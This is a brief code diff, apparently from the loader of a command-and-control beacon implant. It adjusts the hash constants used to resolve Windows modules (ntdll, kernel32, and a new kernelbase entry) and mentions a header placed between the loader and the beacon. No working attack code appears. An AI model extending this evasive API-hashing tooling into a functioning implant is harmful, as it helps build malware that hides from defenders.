@@ -11,10 +11,11 @@ typedef struct _BUFFER {
 //
 // Hashing defines
 //
-#define H_MAGIC_KEY       0x811c9dc5
-#define H_MAGIC_PRIME     0x01000193
-#define H_MODULE_NTDLL    0x318a7963
-#define H_MODULE_KERNEL32 0x04a1a06a
+#define H_MAGIC_KEY          0x811c9dc5
+#define H_MAGIC_PRIME        0x01000193
+#define H_MODULE_NTDLL       0x318a7963
+#define H_MODULE_KERNEL32    0x04a1a06a
+#define H_MODULE_KERNELBASE  0xe9914f7a
 
 //
 // NaxHeader v2 - placed between loader and beacon in nax.bin
